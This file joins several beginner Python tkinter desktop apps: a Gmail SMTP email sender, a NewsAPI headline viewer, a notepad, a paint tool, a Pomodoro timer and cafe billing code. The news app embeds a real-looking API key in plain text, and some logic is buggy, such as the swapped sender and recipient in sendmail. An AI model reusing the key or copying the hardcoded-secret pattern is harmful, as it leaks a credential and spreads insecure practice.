        self.seven = Button(self.frame3, text="7", padx=6, relief=RAISED, borderwidth=2, font=('verdana', 10, 'bold'),
                            bg='#248aa2', fg="white", command=self.seven)
        self.seven.place(x=64, y=24)
        self.plus = Button(self.frame3, text="+", padx=6, relief=RAISED, borderwidth=2, font=('verdana', 10, 'bold'),
                           bg='white', fg="black", command=self.plus)
        self.plus.place(x=96, y=24)

        self.six = Button(self.frame3, text="6", padx=6, relief=RAISED, borderwidth=2, font=('verdana', 10, 'bold'),
                          bg='#248aa2', fg="white", command=self.six)
        self.six.place(x=0, y=50)
        self.five = Button(self.frame3, text="5", padx=6, relief=RAISED, borderwidth=2, font=('verdana', 10, 'bold'),
                           bg='#248aa2', fg="white", command=self.five)
        self.five.place(x=32, y=50)
        self.four = Button(self.frame3, text="4", padx=6, relief=RAISED, borderwidth=2, font=('verdana', 10, 'bold'),
                           bg='#248aa2', fg="white", command=self.four)
        self.four.place(x=64, y=50)
        self.minus = Button(self.frame3, text="-", padx=8, relief=RAISED, borderwidth=2, font=('verdana', 10, 'bold'),
                            bg='white', fg="black", command=self.minus)
        self.minus.place(x=96, y=50)

        self.three = Button(self.frame3, text="3", padx=6, relief=RAISED, borderwidth=2, font=('verdana', 10, 'bold'),
                            bg='#248aa2', fg="white", command=self.three)
        self.three.place(x=0, y=76)
        self.two = Button(self.frame3, text="2", padx=6, relief=RAISED, borderwidth=2, font=('verdana', 10, 'bold'),
                          bg='#248aa2', fg="white", command=self.two)
        self.two.place(x=32, y=76)
        self.one = Button(self.frame3, text="1", padx=6, relief=RAISED, borderwidth=2, font=('verdana', 10, 'bold'),
                          bg='#248aa2', fg="white", command=self.one)
        self.one.place(x=64, y=76)
        self.multiply = Button(self.frame3, text="*", padx=7, relief=RAISED, borderwidth=2,
                               font=('verdana', 10, 'bold'), bg='white', fg="black", command=self.mul)
        self.multiply.place(x=96, y=76)

        self.zero = Button(self.frame3, text="0", padx=6, relief=RAISED, borderwidth=2, font=('verdana', 10, 'bold'),
                           bg='#248aa2', fg="white", command=self.zero)
        self.zero.place(x=0, y=102)
        self.clear = Button(self.frame3, text="C", padx=6, relief=RAISED, borderwidth=2, font=('verdana', 10, 'bold'),
                            bg='#248aa2', fg="white", command=self.clear)
        self.clear.place(x=32, y=102)
        self.equal = Button(self.frame3, text="=", padx=6, relief=RAISED, borderwidth=2, font=('verdana', 10, 'bold'),
                            bg='#248aa2', fg="white", command=self.equal)
        self.equal.place(x=64, y=102)
        self.divide = Button(self.frame3, text="/", padx=7, relief=RAISED, borderwidth=2, font=('verdana', 10, 'bold'),
                             bg='white', fg="black", command=self.divide)
        self.divide.place(x=96, y=102)

        self.Total_Bills_btn = Button(self.root, text="Total", relief=RAISED, borderwidth=2,
                                      font=('verdana', 10, 'bold'), bg='#248aa2', fg="white", command=self.Total_Bill)
        self.Total_Bills_btn.place(x=360, y=245)

        self.Clear_btn = Button(self.root, text="Clear", relief=RAISED, borderwidth=2, font=('verdana', 10, 'bold'),
                                bg='#248aa2', fg="white", command=self.Clear)
        self.Clear_btn.place(x=410, y=245)

        self.icon = ImageTk.PhotoImage(Image.open('false.png'))
        self.Quit_btn = Button(self.root, image=self.icon, relief=RAISED, borderwidth=2, font=('verdana', 10, 'bold'),
                               bg='#248aa2', fg="white", padx=5, command=self.Quit)
        self.Quit_btn.place(x=463, y=245)

        self.root.mainloop()


if __name__ == '__main__':
    cafe_management()

from tkinter import *
import tkinter as tk
from PIL import ImageTk, Image
from tkinter import messagebox
import smtplib
from tkinter.scrolledtext import ScrolledText

root = tk.Tk()


def Login():
    e = email.get()
    p = password.get()

    if '@gmail.com' not in e or e == "":
        messagebox.showerror('Login error', "PLease Write the Valid Email")
    elif p == "":
        messagebox.showerror('Login error', "   Password Shouldn't be Empty")

    else:
        try:

            s = smtplib.SMTP('smtp.gmail.com', 587)
            s.starttls()
            s.login(e, p)  # attempt to log into smtp server
            messagebox.showinfo("Login Success", "You have Logged to Gmail Successfully")

            root = tk.Tk()
            root.geometry('500x400')

            def Logout():
                s.quit()
                root.destroy()

            header1 = Label(root, bg="orange", width=300, height=2)
            header1.place(x=0, y=0)

            h2 = Label(root, text="Email Sender", bg="orange", fg="black", font=('verdana', 13, 'bold'))
            h2.place(x=175, y=5)

            logout = Button(root, text="Logout", padx=20, bg="orange", relief=RIDGE, borderwidth=1,
                            font=('verdana', 10, 'bold'), cursor="hand2", command=Logout)
            logout.place(x=390, y=38)

            r = Label(root, text="Recipetent Email Address", font=('verdana', 10, 'bold'))
            r.place(x=130, y=130)
            recipetent = Entry(root, width=30, relief=RIDGE, borderwidth=3)
            recipetent.place(x=130, y=150)

            st = Label(root, text="Subject", font=('verdana', 10, 'bold'))
            st.place(x=130, y=190)
            subject = Entry(root, width=30, relief=RIDGE, borderwidth=3)
            subject.place(x=130, y=210)

            m = Label(root, text="Message", font=('verdana', 10, 'bold'))
            m.place(x=130, y=250)

            message = ScrolledText(root, width=40, height=5, relief=RIDGE, borderwidth=3)
            message.place(x=130, y=270)

            def Send():
                r = recipetent.get()
                st = subject.get()
                m = message.get('1.0', END)

                if '@gmail.com' not in r or r == "":
                    messagebox.showerror('Sending Mail error', "Please Write the Valid Email")
                elif m == "":
                    messagebox.showerror('Sending Mail error', "Message shouldn't be Empty")

                else:
                    s.sendmail(r, e, f'Subject :{st}\n\n {m}')
                    messagebox.showinfo("Success", "Your Message has been send successfully")

            send = Button(root, text="Send", padx=30, relief=RIDGE, borderwidth=1, bg="orange",
                          font=('verdana', 10, 'bold'), cursor="hand2", command=Send)
            send.place(x=350, y=360)
            root.mainloop()









        except:
            messagebox.showerror('Login error',
                                 "Failed to Login, Either Your Email or Password is Wrong nor You did Enable less secure Apps in gmail Setting")


root.title('Email Sender')
root.geometry('400x300')
root.maxsize(400, 300)
root.minsize(400, 300)

header = Label(root, bg="orange", width=300, height=2)
header.place(x=0, y=0)

h1 = Label(root, text="Email Sender", bg="orange", fg="black", font=('verdana', 13, 'bold'))
h1.place(x=135, y=5)

img = ImageTk.PhotoImage(Image.open('gmail.png'))

logo = Label(root, image=img, borderwidth=0)
logo.place(x=150, y=38)

e = Label(root, text="Email Address", font=('verdana', 10, 'bold'))
e.place(x=100, y=130)
email = Entry(root, width=30, relief=RIDGE, borderwidth=3)
email.place(x=100, y=150)

p = Label(root, text="Password", font=('verdana', 10, 'bold'))
p.place(x=100, y=190)
password = Entry(root, width=30, relief=RIDGE, borderwidth=3)
password.place(x=100, y=210)

login = Button(root, text="Login", padx=30, bg="orange", relief=RIDGE, borderwidth=1, font=('verdana', 10, 'bold'),
               cursor="hand2", command=Login)
login.place(x=135, y=240)

root.mainloop()

# tkinter module
from tkinter import *

# image module
from PIL import Image, ImageTk

# font from tkinter
from tkinter import font

# requests module
import requests

# random module
import random

# main welcome window code
welcome = Tk()
welcome.title("Sami News ")
welcome.geometry('500x500')

background = Image.open('—Pngtree—vector creative hot news tag_4265321.png')
resized_image = background.resize((500, 500), Image.ANTIALIAS)


# function to open second window
def openSecondWindow():
    selected_optioncountry = ""
    selected_optioncategory = ""
    secondwindow = Toplevel()
    secondwindow.title("Select Your Headlines Types")
    secondwindow.geometry("1000x400")
    bold_font = font.Font(family="Helvetica", size=12, weight="bold")
    langlabel = Label(secondwindow, text="Select Country---US for United States of America", font=bold_font)
    langlabel.pack()

    # saving options select from toggle menu
    def save_option():
        nonlocal selected_optioncountry
        selected_optioncountry = (var.get())[:2]

    # saving options from toggle menu
    def save_option2():
        nonlocal selected_optioncategory
        selected_optioncategory = var2.get()

    # get news api from newsapi
    def getnews():
        api_key = "a8ab6d9bd5684d27bab671e76c15eb91"
        country = selected_optioncountry
        cat = selected_optioncategory
        url = f"https://newsapi.org/v2/top-headlines?country={country}&category={cat}&apiKey=" + api_key
        news = requests.get(url).json()
        articles = news["articles"]
        my_articles = []
        my_news = ""

        for article in articles:
            my_articles.append(article["title"])

        for i in range(10):
            my_news += f"{i + 1}. {my_articles[i]}\n"

        button_gethealines.config(text=my_news)

    # toggle menu code 1
    var = (StringVar())
    var.set("US-United States of America")
    options = ["GB-Great Britian", "AU-Australia", "FR-France", "DE-Germany", "RU-Russia", "TR-turkey", "UA-Ukraine"]
    drop_down = OptionMenu(secondwindow, var, *options)
    drop_down.pack()
    save_button = Button(secondwindow, text="Save Country", command=save_option, width=10, height=1, bg="red",
                         fg="white")
    save_button.place(x=100, y=20)
    save_button.pack()
    bold_font = font.Font(family="Helvetica", size=12, weight="bold")
    categorylabel = Label(secondwindow, text="Select Category of News", font=bold_font)
    categorylabel.pack()

    # toggle menu code 2
    var2 = (StringVar())
    var2.set("business")
    options = ["sports", "health", "science", "technology", "general"]
    drop_down2 = OptionMenu(secondwindow, var2, *options)
    drop_down2.pack()
    save_button2 = Button(secondwindow, text="Save Category", command=save_option2, width=10, height=1, bg="red",
                          fg="white")
    save_button2.pack()
    button_gethealines = Button(secondwindow, text="Fetch News", command=getnews)
    button_gethealines.pack()

    secondwindow.mainloop()


# second window of random news generator
def randomwindow():
    randomwindowtab = Toplevel()
    randomwindowtab.title("Random News")
    randomwindowtab.geometry("300x300")

    # get random news by random number generator and countries/categories generated from list
    def randomnews():
        api_key = "a8ab6d9bd5684d27bab671e76c15eb91"
        countries = ['uS', 'gb', 'au', 'fr', 'de', 'ru', 'tr', 'ua']
        categories = ['science', 'health', 'sports', 'technology', 'general']
        cot = random.randint(0, 7)
        cat = random.randint(0, 4)

        url = f"https://newsapi.org/v2/top-headlines?country={(countries[cot])}&category={(categories[cat])}&apiKey=" + api_key
        news = requests.get(url).json()
        articles = news["articles"]
        my_articles = []
        my_news = ""

        for article in articles:
            my_articles.append(article["title"])
        for i in range(10):
            my_news += f"{i + 1}. {my_articles[i]}\n"
        b3.config(text=my_news)

        # button in this window

    b3 = Button(randomwindowtab, command=randomnews, text="Get Random News Now", activeforeground="red", pady=10,
                width=20, height=1)
    b3.pack()
    randomwindowtab.mainloop()


# background image
tk_image = ImageTk.PhotoImage(resized_image)
label = Label(welcome, image=tk_image)
label.place(x=0, y=0, relwidth=1, relheight=1)
# button 1
b1 = Button(welcome, command=openSecondWindow, text="Get News Headlines Of Your Choice", activeforeground="red",
            pady=10, width=30, height=1)
b1.place(x=100, y=90)
# button 2
b2 = Button(welcome, command=randomwindow, text="Get Top10 Random News", activeforeground="red", pady=10, width=20,
            height=1)
b2.pack(side=BOTTOM)
b1.pack(side=BOTTOM)
bold_font = font.Font(family="Helvetica", size=12, weight="bold")
Welcometext = Label(welcome, text="Get Top Headlines Through News Api", font=bold_font)
Welcometext.pack()

welcome.mainloop()

from tkinter import *
import tkinter as tk
from tkinter.scrolledtext import ScrolledText
from tkinter import filedialog
from tkinter import messagebox, font
from tkinter import ttk
from datetime import datetime
import webbrowser


# ======================================================================================
#  ========================== File Code Starts Here  ============================
# =======================================================================================


# =================================== New Code  ======================================
def new():
    text.delete('1.0', 'end')


# ===================================== End =========================================


# ========================= New Window Code  ================================
def new_window():
    root = tk.Tk()
    root.geometry('500x500')

    menubar = Menu(root)

    file = Menu(menubar, tearoff=0)
    file.add_command(label="New", command=new)
    file.add_command(label="New window", command=new_window)
    file.add_command(label="Open", command=Open)
    file.add_command(label="Save", command=save)
    file.add_command(label="Save as", command=save_as)
    file.add_separator()
    file.add_command(label="Exit", command=exit)
    menubar.add_cascade(label="File", menu=file, font=('verdana', 10, 'bold'))

    edit = Menu(menubar, tearoff=0)

    edit.add_command(label="Undo", command=undo)
    edit.add_separator()
    edit.add_command(label="Cut", command=cut)
    edit.add_command(label="Copy", command=copy)
    edit.add_command(label="Paste", command=paste)
    edit.add_command(label="Delete", command=delete)
    edit.add_command(label="Select All", accelerator="Ctrl+A", command=select_all)
    edit.add_command(label="Time/Date", accelerator="F5", command=time)
    menubar.add_cascade(label="Edit", menu=edit)

    Format = Menu(menubar, tearoff=0)

    Format.add_command(label="Word Wrap")
    Format.add_command(label="Font...", command=fonts)

    menubar.add_cascade(label="Format", menu=Format)

    Help = Menu(menubar, tearoff=0)

    Help.add_command(label="View Help", command=view_help)
    Help.add_command(label="Send FeedBack", command=send_feedback)
    Help.add_command(label="About Notepad")

    menubar.add_cascade(label="Help", menu=Help)

    root.config(menu=menubar)

    text = ScrolledText(root, width=1000, height=1000)
    text.place(x=0, y=0)

    root.mainloop()


# =========================== End ==============================================


# ===================== Open File Code ========================================
def Open():
    root.filename = filedialog.askopenfilename(
        initialdir='/',
        title="Select file",
        filetypes=(("jpeg files", "*.jpg"), ("all files", "*.*")))
    file = open(root.filename)
    text.insert('end', file.read())


# ================================= End ==========================================


# ================================ Save File Code ====================================
def save():
    pass


# ================================    End      =======================================

# =================================== save as File code  ==============================
def save_as():
    root.filename = filedialog.asksaveasfile(mode="w", defaultextension='.txt')
    if root.filename is None:
        return
    file_save = str(text.get(1.0, END))
    root.filename.write(file_save)
    root.filename.close()


# ================================ End ============================================

# ================================ Exit Code =====================================
def exit():
    message = messagebox.askquestion('Notepad', "Do you want to save changes")
    if message == "yes":
        save_as()
    else:
        root.destroy()


# ==================================== end =========================================


# ======================================================================================
# ======================= Edit Code Starts Here  ============================
# =======================================================================================

# =========================== Cut code =============================
def cut():
    text.event_generate("<<Cut>>")


# =========================== End code =====================================

# =========================== Cut code =============================
def copy():
    text.event_generate("<<Copy>>")


# =========================== End code =====================================

# =========================== Cut code =============================
def paste():
    text.event_generate("<<Paste>>")


# =========================== End code =====================================


# =========================== Delete all code =============================
def delete():
    message = messagebox.askquestion('Notepad', "Do you want to Delete all")
    if message == "yes":
        text.delete('1.0', 'end')
    else:
        return "break"


# =========================== End code =====================================


# =========================== select all code =============================
def select_all():
    text.tag_add('sel', '1.0', 'end')
    return 'break'


# =========================== End code =============================


# =========================== Time/Date code =============================
def time():
    d = datetime.now()
    text.insert('end', d)


# =========================== End code =============================


# ======================================================================================
# ======================= Edit Code Ends Here  ============================
# =======================================================================================


# ======================================================================================
# ======================= Format Code Starts Here  ============================
# =======================================================================================


def fonts():
    root = tk.Tk()
    root.geometry('400x400')
    root.title('Font')

    l1 = Label(root, text="Font:")
    l1.place(x=10, y=10)
    f = tk.StringVar()
    fonts = ttk.Combobox(root, width=15, textvariable=f, state='readonly', font=('verdana', 10, 'bold'), )
    fonts['values'] = font.families()
    fonts.place(x=10, y=30)
    fonts.current(0)

    l2 = Label(root, text="Font Style:")
    l2.place(x=180, y=10)
    st = tk.StringVar()
    style = ttk.Combobox(root, width=15, textvariable=st, state='readonly', font=('verdana', 10, 'bold'), )
    style['values'] = ('bold', 'bold italic', 'italic')
    style.place(x=180, y=30)
    style.current(0)

    l3 = Label(root, text="Size:")
    l3.place(x=350, y=10)
    sz = tk.StringVar()
    size = ttk.Combobox(root, width=2, textvariable=sz, state='readonly', font=('verdana', 10, 'bold'), )

    size['values'] = (
    8, 9, 10, 12, 15, 20, 23, 25, 27, 30, 35, 40, 43, 47, 50, 55, 65, 76, 80, 90, 100, 150, 200, 255, 300)
    size.place(x=350, y=30)
    size.current(0)

    sample = LabelFrame(root, text="Sample", height=100, width=200)
    sample['font'] = (fonts.get(), size.get(), style.get())
    sample.place(x=180, y=220)

    l4 = Label(sample, text="This is sample")
    l4.place(x=20, y=30)

    def OK():
        text['font'] = (fonts.get(), size.get(), style.get())
        root.destroy()

    ok = Button(root, text="OK", relief=RIDGE, borderwidth=2, padx=20, highlightcolor="blue", command=OK)
    ok.place(x=137, y=350)

    def Apl():
        l4['font'] = (fonts.get(), size.get(), style.get())

    Apply = Button(root, text="Apply", relief=RIDGE, borderwidth=2, padx=20, highlightcolor="blue", command=Apl)
    Apply.place(x=210, y=350)

    def Cnl():
        root.destroy()

    cancel = Button(root, text="Cancel", relief=RIDGE, borderwidth=2, padx=20, command=Cnl)
    cancel.place(x=295, y=350)
    root.mainloop()


# ======================================================================================
# ======================= Format Code Ends Here  ============================
# =======================================================================================

# ======================================================================================
# ======================= Help Code Ends Here  ============================
# =======================================================================================

# ======================   View Help ===================================
def view_help():
    webbrowser.open('#')


# ============================= End =======================================

# ======================   View Help ===================================
def send_feedback():
    webbrowser.open('#')


# ============================= End =======================================


# ======================================================================================
# ======================= Help Code Ends Here  ============================
# =======================================================================================


# ============================= Main Window =============================

root = tk.Tk()
root.geometry('600x300')
root.minsize(200, 100)
root.title('notepad')
root.iconbitmap('notepad.ico')
text = ScrolledText(root, height=1000, undo=True)
text.pack(fill=tk.BOTH)

menubar = Menu(root)

file = Menu(menubar, tearoff=0)
file.add_command(label="New", command=new)
file.add_command(label="New window", command=new_window)
file.add_command(label="Open", command=Open)
file.add_command(label="Save", command=save)
file.add_command(label="Save as", command=save_as)
file.add_separator()
file.add_command(label="Exit", command=exit)
menubar.add_cascade(label="File", menu=file, font=('verdana', 10, 'bold'))

edit = Menu(menubar, tearoff=0)

edit.add_command(label="Undo", accelerator="Ctrl+Z", command=text.edit_undo)
edit.add_command(label="Redo", accelerator="Ctrl+Y", command=text.edit_redo)
edit.add_separator()
edit.add_command(label="Cut", accelerator="Ctrl+X", command=cut)
edit.add_command(label="Copy", accelerator="Ctrl+C", command=copy)
edit.add_command(label="Paste", accelerator="Ctrl+V", command=paste)
edit.add_command(label="Delete", accelerator="Del", command=delete)
edit.add_command(label="Select All", accelerator="Ctrl+A", command=select_all)
edit.add_command(label="Time/Date", accelerator="F5", command=time)
menubar.add_cascade(label="Edit", menu=edit)

Format = Menu(menubar, tearoff=0)

Format.add_command(label="Word Wrap")
Format.add_command(label="Font...", command=fonts)

menubar.add_cascade(label="Format", menu=Format)

Help = Menu(menubar, tearoff=0)

Help.add_command(label="View Help", command=view_help)
Help.add_command(label="Send FeedBack", command=send_feedback)
Help.add_command(label="About Notepad")

menubar.add_cascade(label="Help", menu=Help)

# ======================== Right Click Menu =========================================

m = Menu(root, tearoff=0)
m.add_command(label="Select All", accelerator="Ctrl+A", command=select_all)
m.add_command(label="Cut", accelerator="Ctrl+X", command=cut)
m.add_command(label="Copy", accelerator="Ctrl+C", command=copy)
m.add_command(label="Paste", accelerator="Ctrl+V", command=paste)
m.add_command(label="Delete", accelerator="Del", command=delete)
m.add_separator()
m.add_command(label="Undo", accelerator="Ctrl+Z", command=text.edit_undo)
m.add_command(label="Redo", accelerator="Ctrl+Z", command=text.edit_redo)


def do_popup(event):
    try:
        m.tk_popup(event.x_root, event.y_root)
    finally:
        m.grab_release()


root.bind("<Button-3>", do_popup)

# ==============================================================================

root.config(menu=menubar)
root.mainloop()

# ========================== End =======================================


from tkinter import *
from tkinter.colorchooser import askcolor
from PIL import ImageTk, Image


class Paint(object):
    DEFAULT_PEN_SIZE = 5.0
    DEFAULT_COLOR = 'black'

    def __init__(self):
        self.root = Tk()
        self.root.title('Paint')
        self.root.geometry('500x300')
        self.root.maxsize(500, 300)
        self.root.minsize(500, 300)

        self.paint_tools = Frame(self.root, width=100, height=300, relief=RIDGE, borderwidth=2)
        self.paint_tools.place(x=0, y=0)

        self.pen_logo = ImageTk.PhotoImage(Image.open('pen.png'))
        self.p = Label(self.paint_tools, text="pen", borderwidth=0, font=('verdana', 10, 'bold'))
        self.p.place(x=5, y=11)
        self.pen_button = Button(self.paint_tools, padx=6, image=self.pen_logo, borderwidth=2, command=self.use_pen)
        self.pen_button.place(x=60, y=10)

        self.brush_logo = ImageTk.PhotoImage(Image.open('brush.png'))
        self.b = Label(self.paint_tools, borderwidth=0, text='brush', font=('verdana', 10, 'bold'))
        self.b.place(x=5, y=40)
        self.brush_button = Button(self.paint_tools, image=self.brush_logo, borderwidth=2, command=self.use_brush)
        self.brush_button.place(x=60, y=40)

        self.color_logo = ImageTk.PhotoImage(Image.open('color.png'))
        self.cl = Label(self.paint_tools, text='color', font=('verdana', 10, 'bold'))
        self.cl.place(x=5, y=70)
        self.color_button = Button(self.paint_tools, image=self.color_logo, borderwidth=2, command=self.choose_color)
        self.color_button.place(x=60, y=70)

        self.eraser_logo = ImageTk.PhotoImage(Image.open('eraser.png'))
        self.e = Label(self.paint_tools, text='eraser', font=('verdana', 10, 'bold'))
        self.e.place(x=5, y=100)
        self.eraser_button = Button(self.paint_tools, image=self.eraser_logo, borderwidth=2, command=self.use_eraser)
        self.eraser_button.place(x=60, y=100)

        self.pen_size = Label(self.paint_tools, text="Pen Size", font=('verdana', 10, 'bold'))
        self.pen_size.place(x=15, y=250)
        self.choose_size_button = Scale(self.paint_tools, from_=1, to=10, orient=VERTICAL)
        self.choose_size_button.place(x=20, y=150)

        self.c = Canvas(self.root, bg='white', width=600, height=600, relief=RIDGE, borderwidth=0)
        self.c.place(x=100, y=0)

        self.setup()
        self.root.mainloop()

    def setup(self):
        self.old_x = None
        self.old_y = None
        self.line_width = self.choose_size_button.get()
        self.color = self.DEFAULT_COLOR
        self.eraser_on = False
        self.active_button = self.pen_button
        self.c.bind('<B1-Motion>', self.paint)
        self.c.bind('<ButtonRelease-1>', self.reset)

    def use_pen(self):
        self.activate_button(self.pen_button)

    def use_brush(self):
        self.activate_button(self.brush_button)

    def choose_color(self):
        self.eraser_on = False
        self.color = askcolor(color=self.color)[1]

    def use_eraser(self):
        self.activate_button(self.eraser_button, eraser_mode=True)

    def activate_button(self, some_button, eraser_mode=False):
        self.active_button.config(relief=RAISED)
        some_button.config(relief=SUNKEN)
        self.active_button = some_button
        self.eraser_on = eraser_mode

    def paint(self, event):
        self.line_width = self.choose_size_button.get()
        paint_color = 'white' if self.eraser_on else self.color
        if self.old_x and self.old_y:
            self.c.create_line(self.old_x, self.old_y, event.x, event.y,
                               width=self.line_width, fill=paint_color,
                               capstyle=ROUND, smooth=TRUE, splinesteps=36)
        self.old_x = event.x
        self.old_y = event.y

    def reset(self, event):
        self.old_x, self.old_y = None, None


if __name__ == '__main__':
    Paint()

import tkinter as tk
from tkinter import messagebox
from PIL import Image, ImageTk
from playsound import playsound
import time


class Pomodoro:
    def __init__(self, root):
        self.root = root

    def work_break(self, timer):

        # common block to display minutes
        # and seconds on GUI
        minutes, seconds = divmod(timer, 60)
        self.min.set(f"{minutes:02d}")
        self.sec.set(f"{seconds:02d}")
        self.root.update()
        time.sleep(1)

    def work(self):
        timer = 25 * 60
        while timer >= 0:
            pomo.work_break(timer)
            if timer == 0:
                # once work is done play
                # a sound and switch for break
                playsound("sound.ogg")
                messagebox.showinfo(
                    "Good Job", "Take A Break, \
					nClick Break Button")
            timer -= 1

    def break_(self):
        timer = 5 * 60
        while timer >= 0:
            pomo.work_break(timer)
            if timer == 0:
                # once break is done,
                # switch back to work
                playsound("sound.ogg")
                messagebox.showinfo(
                    "Times Up", "Get Back To Work, \
					nClick Work Button")
            timer -= 1

    def main(self):

        # GUI window configuration
        self.root.geometry("450x455")
        self.root.resizable(False, False)
        self.root.title("Pomodoro Timer")

        # label
        self.min = tk.StringVar(self.root)
        self.min.set("25")
        self.sec = tk.StringVar(self.root)
        self.sec.set("00")

        self.min_label = tk.Label(self.root,
                                  textvariable=self.min, font=(
                "arial", 22, "bold"), bg="red", fg='black')
        self.min_label.pack()

        self.sec_label = tk.Label(self.root,
                                  textvariable=self.sec, font=(
                "arial", 22, "bold"), bg="black", fg='white')
        self.sec_label.pack()

        # add background image for GUI using Canvas widget
        canvas = tk.Canvas(self.root)
        canvas.pack(expand=True, fill="both")
        img = Image.open('pomodoro.jpg')
        bg = ImageTk.PhotoImage(img)
        canvas.create_image(90, 10, image=bg, anchor="nw")

        # create three buttons with countdown function command
        btn_work = tk.Button(self.root, text="Start",
                             bd=5, command=self.work,
                             bg="red", font=(
                "arial", 15, "bold")).place(x=140, y=380)
        btn_break = tk.Button(self.root, text="Break",
                              bd=5, command=self.break_,
                              bg="red", font=(
                "arial", 15, "bold")).place(x=240, y=380)

        self.root.mainloop()


if __name__ == '__main__':
    pomo = Pomodoro(tk.Tk())
    pomo.main()

# =======xxxxxxxxxxxx Created by Aashish admin of pythonworld xxxxxxxxxxxx==================


# =========== Importing Suitable Libraries =========================
from tkinter import *
import tkinter as tk
from tkinter.scrolledtext import ScrolledText
import requests
from tkinter import messagebox
import random
from datetime import datetime
from tkinter import filedialog


# =================== End ===========================================


# ==================== Functions code starts here ======================

# ==========================  Total Button Code ==========================
def total_bills():
    # ============ Drinks Items price ===============
    lassi_price = 50
    coffee_price = 20
    tea_price = 10
    juice_price = 30
    shakes_price = 50
    milk_price = 20
    shikanji_price = 15
    redbull_price = 150
    # ============== Foods Items Price ==================
    roti_price = 5
    dal_makhni_price = 120
    mutter_panner_price = 150
    paratha_price = 40
    mix_veg_price = 70
    omelete_price = 20
    veg_biryani_price = 120
    rice_price = 50

    # ============Drinks Item quantity ===================
    lassi_q = lassi_qty.get()
    coffee_q = coffee_qty.get()
    tea_q = tea_qty.get()
    juice_q = juice_qty.get()
    shakes_q = shakes_qty.get()
    milk_q = milk_qty.get()
    shikanji_q = shikanji_qty.get()
    redbull_q = redbull_qty.get()

    # ============= Foods Item quantity ======================
    roti_q = roti_qty.get()
    dal_makhni_q = dal_makhni_qty.get()
    mutter_panner_q = mutter_panner_qty.get()
    paratha_q = paratha_qty.get()
    mix_veg_q = mix_veg_qty.get()
    omelete_q = omelete_qty.get()
    veg_biryani_q = veg_biryani_qty.get()
    rice_q = rice_qty.get()

    # ================ Drinks Items Validation ====================
    if lassi_var.get() == 0:
        lassi_q = 0
    elif lassi_var.get() == 1 and lassi_qty.get() == "":
        messagebox.showerror("error", "please fill the lassi quantity")
        lassi_q = 0

    if coffee_var.get() == 0:
        coffee_q = 0
    elif coffee_var.get() == 1 and coffee_qty.get() == "":
        messagebox.showerror("error", "please fill the coffee quantity")
        coffee_q = 0

    if tea_var.get() == 0:
        tea_q = 0
    elif tea_var.get() == 1 and tea_qty.get() == "":
        messagebox.showerror("error", "please fill the tea quantity")
        tea_q = 0

    if juice_var.get() == 0:
        juice_q = 0
    elif juice_var.get() == 1 and juice_qty.get() == "":
        messagebox.showerror("error", "please fill the juice quantity")
        juice_q = 0

    if shakes_var.get() == 0:
        shakes_q = 0
    elif shakes_var.get() == 1 and shakes_qty.get() == "":
        messagebox.showerror("error", "please fill the shakes quantity")
        shakes_q = 0

    if milk_var.get() == 0:
        milk_q = 0
    elif milk_var.get() == 1 and milk_qty.get() == "":
        messagebox.showerror("error", "please fill the milk quantity")
        milk_q = 0

    if shikanji_var.get() == 0:
        shikanji_q = 0
    elif shikanji_var.get() == 1 and shikanji_qty.get() == "":
        messagebox.showerror("error", "please fill the shikanji quantity")
        shikanji_q = 0

    if redbull_var.get() == 0:
        redbull_q = 0
    elif redbull_var.get() == 1 and redbull_qty.get() == "":
        messagebox.showerror("error", "please fill the redbull quantity")
        redbull_q = 0

    # ================ Foods Items Validation ====================
    if roti_var.get() == 0:
        roti_q = 0
    elif roti_var.get() == 1 and roti_qty.get() == "":
        messagebox.showerror("error", "please fill the Roti quantity")
        roti_q = 0

    if dal_makhni_var.get() == 0:
        dal_makhni_q = 0
    elif dal_makhni_var.get() == 1 and dal_makhni_qty.get() == "":
        messagebox.showerror("error", "please fill the Dal Makhni quantity")
        coffee_q = 0

    if mutter_panner_var.get() == 0:
        mutter_panner_q = 0
    elif mutter_panner_var.get() == 1 and mutter_panner_qty.get() == "":
        messagebox.showerror("error", "please fill the Mutter panner quantity")
        mutter_panner_q = 0

    if paratha_var.get() == 0:
        paratha_q = 0
    elif paratha_var.get() == 1 and paratha_qty.get() == "":
        messagebox.showerror("error", "please fill the Paratha quantity")
        paratha_q = 0

    if mix_veg_var.get() == 0:
        mix_veg_q = 0
    elif mix_veg_var.get() == 1 and mix_veg_qty.get() == "":
        messagebox.showerror("error", "please fill the Mix Veg quantity")
        mix_veg_q = 0

    if omelete_var.get() == 0:
        omelete_q = 0
    elif omelete_var.get() == 1 and omelete_qty.get() == "":
        messagebox.showerror("error", "please fill the Omelete quantity")
        omelete_q = 0

    if veg_biryani_var.get() == 0:
        veg_biryani_q = 0
    elif veg_biryani_var.get() == 1 and veg_biryani_qty.get() == "":
        messagebox.showerror("error", "please fill the Veg Biryani quantity")
        veg_biryani_q = 0

    if rice_var.get() == 0:
        rice_q = 0
    elif rice_var.get() == 1 and rice_qty.get() == "":
        messagebox.showerror("error", "please fill the Rice quantity")
        rice_q = 0

    # ============ Total Drinks Items Price ===================
    total_lassi_price = lassi_price * int(lassi_q)
    total_coffee_price = coffee_price * int(coffee_q)
    total_tea_price = tea_price * int(tea_q)
    total_juice_price = juice_price * int(juice_q)
    total_shakes_price = shakes_price * int(shakes_q)
    total_milk_price = milk_price * int(milk_q)
    total_shikanji_price = shikanji_price * int(shikanji_q)
    total_redbull_price = redbull_price * int(redbull_q)

    # ============ Total Drinks cost ===================
    total_drinks_cost = total_lassi_price + total_coffee_price + total_tea_price + total_juice_price + total_shakes_price + total_milk_price + total_shikanji_price + total_redbull_price

    if drinks_cost.get() != "":
        drinks_cost.delete(0, "end")
        drinks_cost.insert("end", total_drinks_cost)
    else:
        drinks_cost.insert("end", total_drinks_cost)

    # ============ Total Foods Items Price ===================
    total_roti_price = roti_price * int(roti_q)
    total_dal_makhni_price = dal_makhni_price * int(dal_makhni_q)
    total_mutter_panner_price = mutter_panner_price * int(mutter_panner_q)
    total_paratha_price = paratha_price * int(paratha_q)
    total_mix_veg_price = mix_veg_price * int(mix_veg_q)
    total_omelete_price = omelete_price * int(omelete_q)
    total_veg_biryani_price = veg_biryani_price * int(veg_biryani_q)
    total_rice_price = rice_price * int(rice_q)

    # ============ Total Foods cost ===================
    total_foods_cost = total_roti_price + total_dal_makhni_price + total_mutter_panner_price + total_paratha_price + total_mix_veg_price + total_omelete_price + total_veg_biryani_price + total_rice_price

    if foods_cost.get() != "":
        foods_cost.delete(0, "end")
        foods_cost.insert("end", total_foods_cost)
    else:
        foods_cost.insert("end", total_foods_cost)

